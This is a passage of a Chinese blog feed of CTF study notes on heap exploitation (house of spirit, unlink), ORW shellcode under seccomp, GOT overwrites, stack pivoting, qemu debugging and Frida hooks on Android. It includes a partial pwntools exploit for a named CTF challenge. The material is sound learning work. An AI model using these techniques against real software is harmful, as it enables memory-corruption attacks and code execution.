class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">e=<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">f=<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>这时候d和f就是同一个曾经的a指针。</p><h1 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h1><p>一种针对fastbin的攻击</p><h2 id="什么情况下使用？"><a href="#什么情况下使用？" class="headerlink" title="什么情况下使用？"></a>什么情况下使用？</h2><p>当有一块区域，这个区域上下两部分你都能控制，但是区域内部无法控制，并且区域内部有重要数据，比如返回地址。</p><p>（一般来说，这块区域指的是某个函数栈帧的位置，这个函数的父函数中有局部变量能够控制，这个函数里面还有局部变量你能够控制）</p><p>使用house of spirit可以通过控制前后区域来控制整片区域。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul><li><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</p></li><li><p>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK (0x10!! )</p></li><li><p>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐  （size直接写成0xN0即可）</p></li><li><p>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ  (16)，同时也不能大于av-&gt;system_mem（128kb)</p></li><li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</p></li></ul><p>（64位情况下）</p><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>*(fake_chunk_addr+8)&#x3D;size (当前fake chunk的size 直接0xN0即可)</p><p>fake_chunk物理相邻的下一个chunk的size也要设置，16&lt;size&lt;128kb</p><p>然后free(fake_chunk)</p><p>然后malloc(fake_chunk)</p><p>之后就可以控制这个fake_chunk的所有内容了</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习pwn2</title>
      <link href="/2024/10/16/2024-10.16-pwn%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B92/"/>
      <url>/2024/10/16/2024-10.16-pwn%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B92/</url>
      
        <content type="html"><![CDATA[<h1 id="脚本中gdb调试"><a href="#脚本中gdb调试" class="headerlink" title="脚本中gdb调试"></a>脚本中gdb调试</h1><p>之前不知道自己哪里有问题，现在懂怎么改了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b* 0x4013C2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第三行是关键点，之后在想gdb调试的地方添加gdb.attach语句即可</p><p>使用时，先提升终端的权限为root，再输入tmux，之后进入tmux的界面之后运行脚本即可</p><h1 id="简化书写"><a href="#简化书写" class="headerlink" title="简化书写"></a>简化书写</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure><h1 id="沙盒检测"><a href="#沙盒检测" class="headerlink" title="沙盒检测"></a>沙盒检测</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,addr_mpro+<span class="number">0x800</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,addr_mpro+<span class="number">0x800</span>,<span class="string">&#x27;rax&#x27;</span>)<span class="comment"># 1 stdout  2 stderr </span></span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure><p>可以发现，程序禁用了execve和execveat，不能直接get shell，需要通过orw</p><p>同时，程序也禁用了常规的open read write，需要我们找到他们的替代品</p><p>对于open，我们可以选择使用openat或者openat2（本题已禁用）</p><p>对于read，我们可以选择使用readv，preadv，preadv2（本题可用），pread64或者mmap（本题可用）</p><p>对于write，我们可以选择使用writev（本题可用），sendfile（本题可用，且能省略read）等</p><blockquote><p><a href="https://blog.csdn.net/qq_54218833/article/details/134205383">https://blog.csdn.net/qq_54218833/article/details/134205383</a></p></blockquote><p>shellcode的时候利用这个，rop的时候不要用libc里面的open函数，而是pop rax 然后syscall（目前还不知道原理，猜测是libc内部的open函数其实不是sys_open，因为那个题只让用open read write，其他系统调用都禁用了）</p><h1 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h1><p>如果能够rop的话，可以尝试使用mprotect</p><p>mprotect之后，read，然后写入shellcode，然后返回shellcode地址</p><p>mprotect 函数用于设置一块内存的保护权限（将从 start 开始、长度为 len 的内存的保护属性修改为 prot 指定的值），函数原型如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><p>需要注意的是，指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。</p><p>start必须与0x1000对齐。</p><p>当一个进程的内存访问行为违背了内存的保护属性，内核将发出 SIGSEGV（Segmentation fault，段错误）信号，并且终止该进程。</p><blockquote><p><a href="https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect">https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect</a></p></blockquote><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary &#x27;./libc.so.6&#x27; --multibr |grep &#x27;syscall&#x27;|grep &#x27;ret&#x27;</span><br></pre></td></tr></table></figure><p>注意–multibr这个参数，不然出不来syscall;ret这个</p><blockquote><p><a href="https://github.com/JonathanSalwan/ROPgadget/issues/145">https://github.com/JonathanSalwan/ROPgadget/issues/145</a></p></blockquote><h1 id="xchg-edx-eax"><a href="#xchg-edx-eax" class="headerlink" title="xchg edx, eax ;"></a>xchg edx, eax ;</h1><p>交换edx eax的值，如果找不到pop edx 可以考虑这个片段</p><h1 id="scanf-“-d”"><a href="#scanf-“-d”" class="headerlink" title="scanf(“%d”)"></a>scanf(“%d”)</h1><p>正常输入时，输入为范围在-2147483648~2147483647内的整数。</p><p>如果输入范围在-9223372036854775808~9223372036854775807内的整数，则会截断高位读取，此范围是long long int的范围。</p><p>如果输入范围在long long int范围之外，则统一将参数赋值为-1（0xFFFFFFFF）</p><p>如果输入为非数字，分为下列情况：</p><p>– （1） 如果输入仅有一个，则该输入无效，该值不变。</p><p>– （2） 如果输入有数字前缀（如12345abcd），则scanf仅会读取前面的数字，从第一个非数字开始，后面全部舍弃（12345）。</p><p>– （3） 如果输入有多个且使用一个scanf语句（如scanf(“%d, %d”, &amp;a, &amp;b)）。输入第一个非数字后，后面的所有输入均为无效，前面的输入可以赋值。</p><p>– （4） 如果输入有多个且使用多个scanf语句（含循环，即一个scanf中仅有一个输入），则输入非数字时，如果输入的不是’+’或’-’，则后面紧跟的所有scanf均自动跳过，变为无效，不能输入。如果输入的是’+’或’-’，则会跳过当前输入，后面仍然可以进行输入。</p><p>摘抄自：<a href="https://blog.csdn.net/qq_54218833/article/details/121308367">https://blog.csdn.net/qq_54218833/article/details/121308367</a></p><h1 id="改写got表"><a href="#改写got表" class="headerlink" title="改写got表"></a>改写got表</h1><p>确认保护只有RELRO:    Partial RELRO</p><p>如果是Full RELRO则GOT不可写（mprotect尝试一下？）</p><p>另外got表被程序填入正确地址前后都可以改写，填入之前可以往里面填入别的函数的plt地址，改写之后可以填入别的函数的真实地址</p><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><blockquote><p><a href="https://www.yuque.com/hxfqg9/bin/pqc1nq">https://www.yuque.com/hxfqg9/bin/pqc1nq</a></p></blockquote><p>写文章的时候已经忘了，后面看还能补上不。</p><h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><blockquote><p><a href="https://www.cnblogs.com/max1z/p/15299000.html">https://www.cnblogs.com/max1z/p/15299000.html</a></p></blockquote><p>当栈溢出只能最多溢出到返回地址，则可以考虑栈迁移，基础的栈迁移看上面这个链接</p><p>一般来说题目不会基础</p><blockquote><p><a href="https://bbs.kanxue.com/thread-258030-1.htm">https://bbs.kanxue.com/thread-258030-1.htm</a></p></blockquote><p>稍复杂的就是第一次ret到read的地址（main函数里输入的地址），然后在第二次read的时候读入rop，然后ret到leave_ret。</p><h1 id="pwndbg调试忽略信号"><a href="#pwndbg调试忽略信号" class="headerlink" title="pwndbg调试忽略信号"></a>pwndbg调试忽略信号</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">handle SIGALRM nostop</span> </span><br><span class="line">Signal        Stop      Print   Pass to program Description</span><br><span class="line">SIGALRM       No        Yes     No              Alarm clock</span><br></pre></td></tr></table></figure><p>handle SIGALRM nostop</p><p><code>nostop</code>：让调试器在接收到 <code>SIGALRM</code> 信号时不要停止程序。</p><p><code>noprint</code>：不显示任何关于接收到信号的消息。</p><p><code>pass</code>：允许信号传递给被调试的程序。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu学习</title>
      <link href="/2024/07/06/2024-07-06-qemu%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/07/06/2024-07-06-qemu%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我只使用了一下用户态</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install qemu-user</span><br><span class="line"><span class="built_in">sudo</span> apt-get install qemu-use-binfmt qemu-user-binfmt:i386</span><br><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br></pre></td></tr></table></figure><p>程序如果是动态链接的话还需要动态链接库</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt search <span class="string">&quot;libc6-&quot;</span> | grep <span class="string">&quot;aarch64&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt install libc-aarch64-cross</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb-multiarch</span><br></pre></td></tr></table></figure><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./program</span><br></pre></td></tr></table></figure><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./program</span><br></pre></td></tr></table></figure><p>另起一个shell,然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> gdb-multiarch</span><br><span class="line"> (gdb) file ./program# 也要在本地加载远程的目标程序</span><br><span class="line">Reading symbols from ./program</span><br><span class="line">(No debugging symbols found in ./squashfs-root/bin/ip)</span><br><span class="line">(gdb) set architecture aarch64# 设置架构</span><br><span class="line">The target architecture is set to &quot;aarch64&quot;.</span><br><span class="line">(gdb) target remote localhost:1234</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习</title>
      <link href="/2024/06/30/2024-06-30-%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/06/30/2024-06-30-%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>买了google pixel，重新学一遍安卓逆向。搞一搞frida。root跟着网上的教程来，不过中途挺曲折的，但是已经一个月前root的了，具体</p><p>就不记录了。（当初怎么忘记记录了啊！！）</p><h1 id="LSPosed"><a href="#LSPosed" class="headerlink" title="LSPosed"></a>LSPosed</h1><p>安装此模块时发现未启用Zygisk,在Magisk中右上角设置，启用Zygisk即可。</p><h1 id="MT管理器-NP管理器"><a href="#MT管理器-NP管理器" class="headerlink" title="MT管理器 NP管理器"></a>MT管理器 NP管理器</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install &lt;电脑上的路径&gt;</span><br></pre></td></tr></table></figure><p>MT管理器存在activity记录的功能</p><h1 id="adb-使用"><a href="#adb-使用" class="headerlink" title="adb 使用"></a>adb 使用</h1><blockquote><p><a href="https://blog.csdn.net/u010610691/article/details/77663770">https://blog.csdn.net/u010610691/article/details/77663770</a></p></blockquote><h1 id="开发者助手"><a href="#开发者助手" class="headerlink" title="开发者助手"></a>开发者助手</h1><p>进行apk资源分析</p><h1 id="核心破解"><a href="#核心破解" class="headerlink" title="核心破解"></a>核心破解</h1><p>可以解决同apk不同签名时安装失败的问题</p><h1 id="算法助手"><a href="#算法助手" class="headerlink" title="算法助手"></a>算法助手</h1><p>很牛逼的调试工具</p><p>可以进行动态插桩</p><h1 id="log插桩流程"><a href="#log插桩流程" class="headerlink" title="log插桩流程"></a>log插桩流程</h1><ol><li><p>将插桩所用dex加进apk中，注意重命名，例如classes2.dex  序号要顺延</p></li><li><p>在需要插桩的位置（只能插桩寄存器）插入代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">invoke-static &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure><ol start="3"><li>重新打包签名安装</li><li>在LSPosed中启用算法助手模块并启用当前apk，在算法助手中启用apk总开关并打开log捕获</li><li>运行应用</li><li>在算法助手中得到插桩结果</li></ol></li></ol><p>string@11207:”QVVHVlFUAAcMAQI&#x3D;”</p><h1 id="jeb动态调试"><a href="#jeb动态调试" class="headerlink" title="jeb动态调试"></a>jeb动态调试</h1><p>首先保证apk有调试权限android:debuggable&#x3D;”true”</p><p>然后直接在本机运行程序，jeb附加即可</p><h1 id="IDA动态调试"><a href="#IDA动态调试" class="headerlink" title="IDA动态调试"></a>IDA动态调试</h1><p>将android_server64 通过adb push进手机里</p><p>提一下权限，然后端口转发一下（本机的23946转发到手机里的23946)</p><p>之后运行server64，IDA更改ip为127.0.0.1然后附加调试就可以了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push &lt;server64路径&gt; /data/local/tmp</span><br><span class="line">chmod 777 server64</span><br><span class="line">adb forward tcp:23946 tcp:23946 %端口转发%</span><br><span class="line">./server64</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsof | grep 23946 %查看谁监听了23946端口号%</span><br><span class="line">kill -9 PID        %杀死进程%</span><br></pre></td></tr></table></figure><h1 id="7-1-frida简单搭建"><a href="#7-1-frida简单搭建" class="headerlink" title="7.1 frida简单搭建"></a>7.1 frida简单搭建</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p></blockquote><p>下载好对应版本的frida_server</p><p>利用adb push 到&#x2F;data&#x2F;local&#x2F;tmp中</p><p>su之后.&#x2F;frserver 运行服务端</p><p>之后进行端口转发</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p>在本机终端输入frida-ps -U测试，如果出来的是手机的进程，则说明已经连接成功</p><p>编写js代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> test1 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    test1.<span class="property">privateFunc</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] privateFunc called with str: &quot;</span> + str);</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">privateFunc</span>(str);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] privateFunc returned: &quot;</span> + retval);</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">hookTest1</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>然后注入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U wuaipojie -l example.js</span><br></pre></td></tr></table></figure><p>注入之后就可以在手机里触发逻辑了</p><h2 id="native-hook"><a href="#native-hook" class="headerlink" title="native hook"></a>native hook</h2><p>CISCN2024 android_re</p><p>国赛时没买真机，一直用虚拟机，apk在虚拟机一直崩溃，在真机则可以正常运行（google pixel）</p><p>这里实现一下简单的native层hook</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">        <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libSecret_entrance.so&quot;</span>, <span class="string">&quot;Java_com_example_re11113_jni_getkey&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">        <span class="keyword">if</span> (helloAddr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//Interceptor.attach是Frida里的一个拦截器</span></span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr, &#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line"></span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="keyword">var</span> string=<span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key:&quot;</span>,string);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">        <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libSecret_entrance.so&quot;</span>, <span class="string">&quot;Java_com_example_re11113_jni_getiv&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">        <span class="keyword">if</span> (helloAddr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//Interceptor.attach是Frida里的一个拦截器</span></span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr, &#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="keyword">var</span> string=<span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;iv:&quot;</span>,string);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">hook</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.52pojie.cn/thread-1840174-1-1.html">https://www.52pojie.cn/thread-1840174-1-1.html</a></p><p><a href="https://www.52pojie.cn/thread-1823118-1-1.html">https://www.52pojie.cn/thread-1823118-1-1.html</a></p></blockquote><p>安卓逆向这档事的文档</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink学习</title>
      <link href="/2024/04/11/2024-04-11-unlink%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/11/2024-04-11-unlink%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>unlink学习地址</p><blockquote><p><a href="https://www.yuque.com/hxfqg9/bin/ape5up#G0M19">https://www.yuque.com/hxfqg9/bin/ape5up#G0M19</a></p></blockquote><p>how2heap unsafe_unlink</p><p>还有bilibili视频星盟安全</p><blockquote><p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=20&vd_source=a85daf8eb54f32264d9f6976d087fe98">https://www.bilibili.com/video/BV1Uv411j7fr?p=20&amp;vd_source=a85daf8eb54f32264d9f6976d087fe98</a></p></blockquote><p>这两个讲的unlink挺好的，尤其是第一个how2heap跟着调试一遍程序就完全理解了</p><h1 id="unlink-思路"><a href="#unlink-思路" class="headerlink" title="unlink 思路"></a>unlink 思路</h1><p>在此不会详细讲解unlink的原理，写博客的目的是为了我以后回过头来看能快速理解</p><p>我们malloc两块内存，第一块内存大小限制比较少，第二块申请的内存大小必须大于等于0x80（保证不落于fastbin)</p><p>edit第一块内存和第二块内存的头部(通过溢出)，内存布局是这样的</p><p>下面的chunkptr指的是存储了下面chunk地址的全局变量</p><p>一般来说题目中会有将malloc的内存地址放在一个全局变量数组里当做页码，这时候就满足这个要求了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000                 0000000000000041 (size)</span><br><span class="line">0000000000000000                 0000000000000030(size-0x10)</span><br><span class="line">chunkptr-0x18(fd)                chunkptr-0x10(bk)</span><br><span class="line">padding···                       pading···</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">(物理相邻的下一个chunk)</span><br><span class="line">0000000000000030(size-0x10)      0000000000000090 (第二块堆的size，要求末位必须为0)</span><br><span class="line">···                              ···</span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>之后free掉第二个堆，这样操作系统就会以为第一个堆是已经释放掉的，接下来将会合并两个堆块，合并之后，由于双向链表的一些操作，就会让chunkptr中存储chunkptr-0x18。</p><p>之后我们编辑第一个堆块，就相当于往chunkptr-0x18的地方写东西，我们可以覆盖掉chunkptr甚至覆盖掉其他堆块的指针，实现任意地址写。</p><p>一种get shell的方式是，通过got表的修改，往某一个chunkptr+x上写入free_got，之后edit这个第x-1个堆块，就可以将free_got写入puts_plt。之后往另一个chunkptr+y上写入puts_got（任意已经执行过的函数的got），之后free掉第y-1个堆块，这样我们就得到了puts_got的地址，之后就可以拿到libc的地址，从而得到system的地址。再修改free_got为system的地址，往另一个堆块上写入“&#x2F;bin&#x2F;sh\x00”，free掉这个堆块，即可get shell。</p><h1 id="题目限制条件"><a href="#题目限制条件" class="headerlink" title="题目限制条件"></a>题目限制条件</h1><ol><li>第二块malloc_size必须大于等于0x80</li><li>第一块内存指针必须能在全局变量中存储</li><li>能够通过某种方法编辑第二块内存的头部</li><li>glibc版本为2.23</li></ol><h1 id="题目及exp"><a href="#题目及exp" class="headerlink" title="题目及exp"></a>题目及exp</h1><p>题目是buuctf上的 DASCTF 2023六月挑战赛｜二进制专项 题目 名字为easynote。</p><blockquote><p><a href="https://buuoj.cn/match/matches/185/challenges">https://buuoj.cn/match/matches/185/challenges</a></p></blockquote><p>非常典型的unlink漏洞，PIE也没有开启，贴出我自己的exp，思路与上面的思路完全一致</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,27959)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The length of your content ---&gt;&quot;</span>,size)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content ---&gt;&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,length,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Index ---&gt;&quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;The length of your content ---&gt;&quot;</span>,length)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content ---&gt;&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Index ---&gt;&quot;</span>,index)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    